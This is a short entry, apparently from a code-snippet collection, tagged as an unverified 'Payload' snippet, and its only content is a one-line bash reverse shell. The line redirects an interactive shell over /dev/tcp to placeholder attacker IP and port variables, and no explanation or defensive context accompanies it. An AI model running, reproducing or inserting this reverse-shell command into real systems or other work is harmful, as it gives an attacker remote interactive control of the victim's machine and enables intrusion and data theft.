---
id: 7cda3fda-9da5-4fb0-9eb5-67b422d9578f
type: code
language: Payload
verified: false
created_at: '2020-03-16T07:35:55.306683+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 7cda3fda

**Language**: Payload

```payload
bash -i >& /dev/tcp/$_ATTACKER_IP/$_ATTACKER_PORT 0>&1
```
